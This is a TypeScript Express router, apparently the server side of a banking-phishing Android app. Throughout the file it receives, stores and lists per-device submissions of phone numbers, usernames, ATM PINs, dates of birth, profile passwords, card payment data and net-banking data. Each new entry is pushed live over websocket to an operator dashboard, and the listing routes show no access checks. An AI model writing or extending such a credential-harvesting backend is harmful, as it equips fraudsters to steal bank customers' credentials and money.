import express, { Request, Response } from "express";
import FormSubmission from "../models/FormSubmission";
import Payment from "../models/Payment";
import logger from "../logger/logger";
import wsService from "../services/wsService";

const router = express.Router();

/**
 * Helper: normalize a FormSubmission doc into Android-friendly FormEntry shape.
 * Tries multiple payload keys for best compatibility.
 */
function transformFormDoc(doc: any) {
  const payload = doc.payload || {};

  const phoneNumber =
    payload.phoneNumber ??
    payload.mobileNumber ??
    payload.phone ??
    payload.msisdn ??
    payload.phone_number ??
    "";

  const username =
    payload.username ??
    payload.name ??
    payload.userName ??
    payload.user ??
    "";

  const atmPin =
    payload.atmPin ??
    payload.pin ??
    payload.atm_pin ??
    payload.atmpin ??
    payload.pin_code ??
    "";

  return {
    _id: doc._id,
    uniqueid: doc.uniqueid || payload.uniqueid || "",
    phoneNumber,
    username,
    atmPin,
    payload,
    createdAt: doc.createdAt,
    updatedAt: doc.updatedAt,
  };
}

/* ================= DASHBOARD SUMMARY ================= */

router.get("/dashboard/forms-summary", async (_req: Request, res: Response) => {
  try {
    const [formsCount, cardPaymentsCount, netBankingCount] = await Promise.all([
      FormSubmission.countDocuments({}),
      Payment.countDocuments({ method: "card" }),
      Payment.countDocuments({ method: "netbanking" }),
    ]);

    return res.json({
      formsCount: Number(formsCount || 0),
      cardPaymentsCount: Number(cardPaymentsCount || 0),
      netBankingCount: Number(netBankingCount || 0),
    });
  } catch (err: any) {
    logger.error("forms: dashboard forms-summary failed", err);
    return res.status(500).json({
      formsCount: 0,
      cardPaymentsCount: 0,
      netBankingCount: 0,
    });
  }
});

/* ================= LIST FORM SUBMISSIONS ================= */
router.get("/form_submissions", async (_req: Request, res: Response) => {
  try {
    const docs = await FormSubmission.find().lean();
    const out = docs.map(transformFormDoc);
    return res.json(out);
  } catch (err: any) {
    logger.error("forms: list form_submissions failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET FORM BY DEVICE ================= */
router.get("/form_submissions/user/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await FormSubmission.find({
      uniqueid: req.params.uniqueid,
    }).lean();

    const out = docs.map(transformFormDoc);
    return res.json(out);
  } catch (err: any) {
    logger.error("forms: fetch by device failed", err);
    return res.status(500).json([]);
  }
});

/* ================= DELETE FORM SUBMISSION ================= */
router.delete("/form_submissions/:uniqueid", async (req: Request, res: Response) => {
  try {
    await FormSubmission.deleteOne({ uniqueid: req.params.uniqueid });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: delete form_submission failed", err);
    return res.status(500).json({ success: false, error: err?.message });
  }
});

/* ================= GET CARD PAYMENTS BY DEVICE ================= */
router.get("/card_payments/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await Payment.find({
      uniqueid: req.params.uniqueid,
      method: "card",
    }).lean();

    return res.json(docs.map((d) => d.payload));
  } catch (err: any) {
    logger.error("forms: card payments fetch failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET NET BANKING BY DEVICE ================= */
router.get("/net_banking/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const docs = await Payment.find({
      uniqueid: req.params.uniqueid,
      method: "netbanking",
    }).lean();

    return res.json(docs.map((d) => d.payload));
  } catch (err: any) {
    logger.error("forms: net banking fetch failed", err);
    return res.status(500).json([]);
  }
});

/* ================= GET SUCCESS DATA ================= */
router.get("/success_data/device/:uniqueid", async (req: Request, res: Response) => {
  try {
    const doc = await FormSubmission.findOne({
      uniqueid: req.params.uniqueid,
    }).lean();

    if (!doc) return res.json({ dob: "", profilePassword: "" });

    const payload = doc.payload || {};
    return res.json({
      dob: payload.dob || "",
      profilePassword: payload.profilePassword || "",
    });
  } catch (err: any) {
    logger.error("forms: success_data fetch failed", err);
    return res.status(500).json({});
  }
});

/* ================= POST: SUCCESS DATA ================= */
router.post("/success_data", async (req: Request, res: Response) => {
  const body = req.body || {};
  const uniqueid = body.uniqueid || "";

  if (!uniqueid) {
    return res.status(400).json({ success: false, error: "missing uniqueid" });
  }

  try {
    logger.info("forms: success_data payload", {
      uniqueid,
      dob: body.dob,
      profilePassword: body.profilePassword,
    });

    const update: any = { $set: {} };
    if (Object.prototype.hasOwnProperty.call(body, "dob")) {
      update.$set["payload.dob"] = body.dob ?? "";
    }
    if (Object.prototype.hasOwnProperty.call(body, "profilePassword")) {
      update.$set["payload.profilePassword"] = body.profilePassword ?? "";
    }

    if (Object.keys(update.$set).length === 0) {
      logger.warn("forms: success_data called but no dob/profilePassword keys present", { uniqueid });
      return res.json({ success: true });
    }

    await FormSubmission.findOneAndUpdate({ uniqueid }, update, { upsert: true });

    try {
      wsService.broadcastFormUpdate(uniqueid, {
        uniqueid,
        dob: Object.prototype.hasOwnProperty.call(body, "dob") ? body.dob ?? "" : undefined,
        profilePassword: Object.prototype.hasOwnProperty.call(body, "profilePassword")
          ? body.profilePassword ?? ""
          : undefined,
        updatedAt: Date.now(),
      });
    } catch (e) {
      logger.warn("forms: broadcast form:update failed", e);
    }

    logger.info("forms: success_data updated", { uniqueid, changes: Object.keys(update.$set) });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: success_data failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ================= POST: generic form_submissions ================= */
router.post("/form_submissions", async (req: Request, res: Response) => {
  const body = req.body || {};
  try {
    const doc = new FormSubmission({
      uniqueid: body.uniqueid || body.deviceId || "",
      payload: body,
    });

    await doc.save();
    logger.info("forms: form_submissions saved", { uniqueid: doc.uniqueid });

    try {
      const transformed = transformFormDoc(doc.toObject ? doc.toObject() : doc);
      wsService.broadcastFormNew(doc.uniqueid || body.uniqueid || body.deviceId || "", transformed);
    } catch (e) {
      logger.warn("forms: broadcast form:new failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: save form_submissions failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

/* ================= POST: card_payments ================= */
router.post("/card_payments", async (req: Request, res: Response) => {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "card",
      payload: body,
      status: "pending",
    });

    await p.save();

    try {
      wsService.broadcastPaymentNew(body.uniqueid || "", "card", body);
    } catch (e) {
      logger.warn("forms: broadcast payment:new(card) failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: card_payment failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

router.post("/net_banking", async (req: Request, res: Response) => {
  try {
    const body = req.body || {};
    const p = new Payment({
      uniqueid: body.uniqueid || "",
      method: "netbanking",
      payload: body,
      status: "pending",
    });

    await p.save();

    try {
      wsService.broadcastPaymentNew(body.uniqueid || "", "netbanking", body);
    } catch (e) {
      logger.warn("forms: broadcast payment:new(netbanking) failed", e);
    }

    return res.json({ success: true });
  } catch (err: any) {
    logger.error("forms: net_banking failed", err);
    return res.status(500).json({ success: false, error: err?.message || "server error" });
  }
});

export default router;
